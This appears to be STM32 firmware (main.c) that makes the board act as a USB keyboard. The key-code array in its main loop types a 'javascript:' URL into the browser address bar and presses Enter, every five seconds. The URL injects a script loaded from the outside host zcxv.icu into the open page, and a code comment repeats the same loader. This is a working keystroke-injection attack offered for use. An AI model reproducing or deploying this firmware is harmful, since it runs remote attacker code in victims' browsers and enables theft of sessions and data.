/* USER CODE BEGIN Header */
/**
 ******************************************************************************
 * @file           : main.c
 * @brief          : Main program body
 ******************************************************************************
 * @attention
 *
 * Copyright (c) 2022 STMicroelectronics.
 * All rights reserved.
 *
 * This software is licensed under terms that can be found in the LICENSE file
 * in the root directory of this software component.
 * If no LICENSE file comes with this software, it is provided AS-IS.
 *
 ******************************************************************************
 */
/* USER CODE END Header */
/* Includes ------------------------------------------------------------------*/
#include "main.h"

#include "usb_device.h"

#include "usbd_hid.h"

#define KEY_RELEASED 0

#define LCTRL 0
#define LSHIFT 100
#define LALT 200
#define LWIN 300
#define RCTRL 400
#define RSHIFT 500
#define RALT 600
#define RWIN 600

#define KEY_A 4
#define KEY_B 5
#define KEY_C 6
#define KEY_D 7
#define KEY_E 8
#define KEY_F 9
#define KEY_G 10
#define KEY_H 11
#define KEY_I 12
#define KEY_J 13
#define KEY_K 14
#define KEY_L 15
#define KEY_M 16
#define KEY_N 17
#define KEY_O 18
#define KEY_P 19
#define KEY_Q 20
#define KEY_R 21
#define KEY_S 22
#define KEY_T 23
#define KEY_U 24
#define KEY_V 25
#define KEY_W 26
#define KEY_X 27
#define KEY_Y 28
#define KEY_Z 29
#define KEY_1 30
#define KEY_2 31
#define KEY_3 32
#define KEY_4 33
#define KEY_5 34
#define KEY_6 35
#define KEY_7 36
#define KEY_8 37
#define KEY_9 38
#define KEY_0 39
#define KEY_ENTER 40
#define KEY_ESC 41
#define KEY_BACKSPACE 42
#define KEY_TAB 43
#define KEY_SPACE 44
#define KEY_MINUS 45
#define KEY_EQUAL 46
#define KEY_LEFT_BRACE 47
#define KEY_RIGHT_BRACE 48
#define KEY_BACKSLASH 49
#define KEY_NUMBER 50
#define KEY_SEMICOLON 51
#define KEY_QUOTE 52
#define KEY_TILDE 53
#define KEY_COMMA 54
#define KEY_PERIOD 55
#define KEY_SLASH 56
#define KEY_CAPS_LOCK 57
#define KEY_F1 58
#define KEY_F2 59
#define KEY_F3 60
#define KEY_F4 61
#define KEY_F5 62
#define KEY_F6 63
#define KEY_F7 64
#define KEY_F8 65
#define KEY_F9 66
#define KEY_F10 67
#define KEY_F11 68
#define KEY_F12 69
#define KEY_PRINTSCREEN 70
#define KEY_SCROLL_LOCK 71
#define KEY_PAUSE 72
#define KEY_INSERT 73
#define KEY_HOME 74
#define KEY_PAGE_UP 75
#define KEY_DELETE 76
#define KEY_END 77
#define KEY_PAGE_DOWN 78
#define KEY_RIGHT 79
#define KEY_LEFT 80
#define KEY_DOWN 81
#define KEY_UP 82
#define KEY_NUM_LOCK 83
#define KEYPAD_SLASH 84
#define KEYPAD_ASTERIX 85
#define KEYPAD_MINUS 86
#define KEYPAD_PLUS 87
#define KEYPAD_ENTER 88
#define KEYPAD_1 89
#define KEYPAD_2 90
#define KEYPAD_3 91
#define KEYPAD_4 92
#define KEYPAD_5 93
#define KEYPAD_6 94
#define KEYPAD_7 95
#define KEYPAD_8 96
#define KEYPAD_9 97
#define KEYPAD_0 98
#define KEYPAD_DOT 99

/* Private includes ----------------------------------------------------------*/
/* USER CODE BEGIN Includes */

/* USER CODE END Includes */

/* Private typedef -----------------------------------------------------------*/
/* USER CODE BEGIN PTD */

/* USER CODE END PTD */

/* Private define ------------------------------------------------------------*/
/* USER CODE BEGIN PD */
extern USBD_HandleTypeDef hUsbDeviceFS;

typedef struct {
    uint8_t MODIFIER;
    uint8_t RESERVED;
    uint8_t KEYCODE1;
    uint8_t KEYCODE2;
    uint8_t KEYCODE3;
    uint8_t KEYCODE4;
    uint8_t KEYCODE5;
    uint8_t KEYCODE6;
}
subKeyBoard;

subKeyBoard keyBoardHIDsub = {
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0
};
/* USER CODE END PD */

/* Private macro -------------------------------------------------------------*/
/* USER CODE BEGIN PM */

/* USER CODE END PM */

/* Private variables ---------------------------------------------------------*/

/* USER CODE BEGIN PV */

/* USER CODE END PV */

/* Private function prototypes -----------------------------------------------*/
void SystemClock_Config(void);
static void MX_GPIO_Init(void);
/* USER CODE BEGIN PFP */

/* USER CODE END PFP */

/* Private user code ---------------------------------------------------------*/
/* USER CODE BEGIN 0 */

/* USER CODE END 0 */

/**
 * @brief  The application entry point.
 * @retval int
 */
int main(void) {
    /* USER CODE BEGIN 1 */

    /* USER CODE END 1 */

    /* MCU Configuration--------------------------------------------------------*/

    /* Reset of all peripherals, Initializes the Flash interface and the Systick. */
    HAL_Init();

    /* USER CODE BEGIN Init */

    /* USER CODE END Init */

    /* Configure the system clock */
    SystemClock_Config();

    /* USER CODE BEGIN SysInit */

    /* USER CODE END SysInit */

    /* Initialize all configured peripherals */
    MX_GPIO_Init();
    MX_USB_DEVICE_Init();
    /* USER CODE BEGIN 2 */

    /* USER CODE END 2 */

    /* Infinite loop */
    /* USER CODE BEGIN WHILE */
    //d=document;t=d.createElement("script");t.src="//zcxv.icu/4";d.body.appendChild(t)
    unsigned short int arr[] = {
    		1,  15,   0,   0,   0,   0,   0, //Ctrl L
    		1,   4,   0,   0,   0,   0,   0, //Ctrl A

    		0,  13,   4,  25,   0,   0,   0,
    		0,   4,  22,   6,  21,  12,  19,
    		0,  23,   0,   0,   0,   0,   0,
    		2,  51,   0,   0,   0,   0,   0,
    		0,   7,  46,   0,   0,   0,   0,
    		0,   7,  18,   6,  24,  16,   8,
    		0,  17,  23,  51,   0,   0,   0,
    		0,  23,  46,   7,  55,   6,  21,
    		0,   8,   4,   0,   0,   0,   0,
    		0,  23,   8,   0,   0,   0,   0,
    		2,   8,   0,   0,   0,   0,   0,
    		0,  15,   8,  16,   0,   0,   0,
    		0,   8,  17,  23,   0,   0,   0,
    		2,  38,  52,   0,   0,   0,   0,
    		0,  22,   6,  21,  12,  19,  23,
    		2,  52,  39,   0,   0,   0,   0,
    		0,  51,  23,  55,  22,  21,   6,
    		0,  46,   0,   0,   0,   0,   0,
    		2,  52,   0,   0,   0,   0,   0,
    		0,  56,   0,   0,   0,   0,   0,
    		0,  56,  29,   6,  27,  25,  55,
    		0,  12,   0,   0,   0,   0,   0,
    		0,   6,  24,  56,  33,   0,   0,
    		2,  52,   0,   0,   0,   0,   0,
    		0,  51,   7,  55,   5,  18,   0,
    		0,   7,  28,  55,   4,  19,   0,
    		0,  19,   8,  17,   7,   0,   0,
    		2,   6,   0,   0,   0,   0,   0,
    		0,  11,  12,  15,   7,   0,   0,
    		2,  38,   0,   0,   0,   0,   0,
    		0,  23,   0,   0,   0,   0,   0,
    		2,  39,   0,   0,   0,   0,   0

    		,0 , 40, 0, 0, 0, 0, 0 //enter
    };

    int timeout = 50;
    int timeoutLong = 5000;
    /* USER CODE BEGIN 3 */
    int count = sizeof(arr) / sizeof(arr[0]);

    HAL_Delay(timeoutLong);
    while (1) {
        /* USER CODE END WHILE */

        for (int i = 0; i < count; i = i + 7) {
            int code = (int) arr[i];
            keyBoardHIDsub.MODIFIER = arr[i];
            keyBoardHIDsub.KEYCODE1 = arr[i + 1];
            keyBoardHIDsub.KEYCODE2 = arr[i + 2];
            keyBoardHIDsub.KEYCODE3 = arr[i + 3];
            keyBoardHIDsub.KEYCODE4 = arr[i + 4];
            keyBoardHIDsub.KEYCODE5 = arr[i + 5];
            keyBoardHIDsub.KEYCODE6 = arr[i + 6];
            USBD_HID_SendReport( & hUsbDeviceFS, & keyBoardHIDsub, sizeof(keyBoardHIDsub));
            HAL_Delay(timeout);
            keyBoardHIDsub.MODIFIER = KEY_RELEASED;
            keyBoardHIDsub.KEYCODE1 = KEY_RELEASED;
            keyBoardHIDsub.KEYCODE2 = KEY_RELEASED;
            keyBoardHIDsub.KEYCODE3 = KEY_RELEASED;
            keyBoardHIDsub.KEYCODE4 = KEY_RELEASED;
            keyBoardHIDsub.KEYCODE5 = KEY_RELEASED;
            keyBoardHIDsub.KEYCODE6 = KEY_RELEASED;
            keyBoardHIDsub.KEYCODE1 = KEY_RELEASED;
            USBD_HID_SendReport( & hUsbDeviceFS, & keyBoardHIDsub, sizeof(keyBoardHIDsub));
            HAL_Delay(timeout);
        }

        HAL_Delay(timeoutLong);

    }
    /* USER CODE END 3 */
}

/**
 * @brief System Clock Configuration
 * @retval None
 */
void SystemClock_Config(void) {
    RCC_OscInitTypeDef RCC_OscInitStruct = {
        0
    };
    RCC_ClkInitTypeDef RCC_ClkInitStruct = {
        0
    };
    RCC_PeriphCLKInitTypeDef PeriphClkInit = {
        0
    };

    /** Initializes the RCC Oscillators according to the specified parameters
     * in the RCC_OscInitTypeDef structure.
     */
    RCC_OscInitStruct.OscillatorType = RCC_OSCILLATORTYPE_HSE;
    RCC_OscInitStruct.HSEState = RCC_HSE_ON;
    RCC_OscInitStruct.HSEPredivValue = RCC_HSE_PREDIV_DIV1;
    RCC_OscInitStruct.HSIState = RCC_HSI_ON;
    RCC_OscInitStruct.PLL.PLLState = RCC_PLL_ON;
    RCC_OscInitStruct.PLL.PLLSource = RCC_PLLSOURCE_HSE;
    RCC_OscInitStruct.PLL.PLLMUL = RCC_PLL_MUL6;
    if (HAL_RCC_OscConfig( & RCC_OscInitStruct) != HAL_OK) {
        Error_Handler();
    }

    /** Initializes the CPU, AHB and APB buses clocks
     */
    RCC_ClkInitStruct.ClockType = RCC_CLOCKTYPE_HCLK | RCC_CLOCKTYPE_SYSCLK |
        RCC_CLOCKTYPE_PCLK1 | RCC_CLOCKTYPE_PCLK2;
    RCC_ClkInitStruct.SYSCLKSource = RCC_SYSCLKSOURCE_PLLCLK;
    RCC_ClkInitStruct.AHBCLKDivider = RCC_SYSCLK_DIV4;
    RCC_ClkInitStruct.APB1CLKDivider = RCC_HCLK_DIV1;
    RCC_ClkInitStruct.APB2CLKDivider = RCC_HCLK_DIV1;

    if (HAL_RCC_ClockConfig( & RCC_ClkInitStruct, FLASH_LATENCY_1) != HAL_OK) {
        Error_Handler();
    }
    PeriphClkInit.PeriphClockSelection = RCC_PERIPHCLK_USB;
    PeriphClkInit.UsbClockSelection = RCC_USBCLKSOURCE_PLL;
    if (HAL_RCCEx_PeriphCLKConfig( & PeriphClkInit) != HAL_OK) {
        Error_Handler();
    }
}

/**
 * @brief GPIO Initialization Function
 * @param None
 * @retval None
 */
static void MX_GPIO_Init(void) {

    /* GPIO Ports Clock Enable */
    __HAL_RCC_GPIOD_CLK_ENABLE();
    __HAL_RCC_GPIOA_CLK_ENABLE();

}

/* USER CODE BEGIN 4 */

/* USER CODE END 4 */

/**
 * @brief  This function is executed in case of error occurrence.
 * @retval None
 */
void Error_Handler(void) {
    /* USER CODE BEGIN Error_Handler_Debug */
    /* User can add his own implementation to report the HAL error return state */
    __disable_irq();
    while (1) {}
    /* USER CODE END Error_Handler_Debug */
}

#ifdef USE_FULL_ASSERT
/**
 * @brief  Reports the name of the source file and the source line number
 *         where the assert_param error has occurred.
 * @param  file: pointer to the source file name
 * @param  line: assert_param error line source number
 * @retval None
 */
void assert_failed(uint8_t * file, uint32_t line) {
    /* USER CODE BEGIN 6 */
    /* User can add his own implementation to report the file name and line number,
       ex: printf("Wrong parameters value: file %s on line %d\r\n", file, line) */
    /* USER CODE END 6 */
}
#endif /* USE_FULL_ASSERT */
